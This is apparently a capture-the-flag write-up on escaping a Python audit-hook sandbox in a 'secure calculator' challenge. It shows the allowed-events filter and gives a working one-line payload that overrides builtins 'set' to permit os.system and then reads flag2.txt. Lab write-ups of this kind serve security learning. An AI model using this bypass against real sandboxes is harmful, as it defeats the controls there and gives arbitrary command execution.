# HAXLAB - Flag Leak 2

The challenge provided a python file implementing a secure calculator. It requires at least python 3.8.5 to run, as it makes use of audit hooks, which has been added along 3.8 and had some fixes in more recent versions.

The script is the same as in the previous version of the challenge, but it requires Remote Code Execution to obtain the content of ```flag2.txt```. The general approach followed in the previous challenge is not adequate, and additional techniques must be used.

An important approach is to list what is available in the builtins:
``` 
>>> exec("for k,v in enumerate(globals()['__builtins__']): print(k,v)")
0 __name__
1 __doc__
2 __package__
3 __loader__
4 __spec__
5 __build_class__
6 __import__
7 abs
8 all
9 any
10 ascii
11 bin
12 breakpoint
13 callable
14 chr
15 compile
16 delattr
17 dir
18 divmod
19 eval
20 exec
21 format
22 getattr
23 globals
24 hasattr
25 hash
26 hex
27 id
28 input
29 isinstance
30 issubclass
31 iter
32 len
33 locals
34 max
35 min
36 next
37 oct
38 ord
39 pow
40 print
41 repr
42 round
43 setattr
44 sorted
45 sum
46 vars
47 None
48 Ellipsis
49 NotImplemented
50 False
51 True
52 bool
53 memoryview
54 bytearray
55 bytes
56 classmethod
57 complex
58 dict
59 enumerate
60 filter
61 float
62 frozenset
63 property
64 int
65 list
66 map
67 object
68 range
69 reversed
70 set
71 slice
72 staticmethod
73 str
74 super
75 tuple
76 type
77 zip
78 __debug__
79 BaseException
80 Exception
81 TypeError
82 StopAsyncIteration
83 StopIteration
84 GeneratorExit
85 SystemExit
86 KeyboardInterrupt
87 ImportError
88 ModuleNotFoundError
89 OSError
90 EnvironmentError
91 IOError
92 EOFError
93 RuntimeError
94 RecursionError
95 NotImplementedError
96 NameError
97 UnboundLocalError
98 AttributeError
99 SyntaxError
100 IndentationError
101 TabError
102 LookupError
103 IndexError
104 KeyError
105 ValueError
106 UnicodeError
107 UnicodeEncodeError
108 UnicodeDecodeError
109 UnicodeTranslateError
110 AssertionError
111 ArithmeticError
112 FloatingPointError
113 OverflowError
114 ZeroDivisionError
115 SystemError
116 ReferenceError
117 MemoryError
118 BufferError
119 Warning
120 UserWarning
121 DeprecationWarning
122 PendingDeprecationWarning
123 SyntaxWarning
124 RuntimeWarning
125 FutureWarning
126 ImportWarning
127 UnicodeWarning
128 BytesWarning
129 ResourceWarning
130 ConnectionError
131 BlockingIOError
132 BrokenPipeError
133 ChildProcessError
134 ConnectionAbortedError
135 ConnectionRefusedError
136 ConnectionResetError
137 FileExistsError
138 FileNotFoundError
139 IsADirectoryError
140 NotADirectoryError
141 InterruptedError
142 PermissionError
143 ProcessLookupError
144 TimeoutError
145 open
146 quit
147 exit
148 copyright
149 credits
150 license
151 help
152 _
```

We can use some of this entries, but if they trigger an audit event, they will mostly be blocked.
The reason is that as two lines only allow events presented on a fixed set:
```
...
    ALLOWED_EVENTS = set({'builtins.input', 'builtins.input/result', 'exec', 'compile'})
    if event not in ALLOWED_EVENTS:
...
```

While the code may seem to be fail proof, you can see that the use of ```set``` is not required to implement such filter. It is actually the attack vector.

Because we have access to ```globals()['__builtins__']```  we can redefine many core funtions, and we can redefine ```set```, providing an alternative implementation.

This implementation will ignore the argument provided an return a fixed set, with a content we can control. The content includes previous events and then the events we require to call a system command or to open a file. Basically we get full control over the program and can execute any code we want.

Because the objective is to demonstrate arbitrary RCE, our object is to include ```os.system``` and define ```set``` ```as lambda x: ['builtins.input', 'builtins.input/result','exec', 'os.system']```. 
The result is our payload, that will obtain the flag.

```
>>> exec("globals()['__builtins__']['set']=lambda x: ['builtins.input', 'builtins.input/result','exec', 'compile', 'os.system']\nimport os\nos.system('cat flag2.txt')")

```

This was solved minutes after the CTF, so the flag was not available to us.
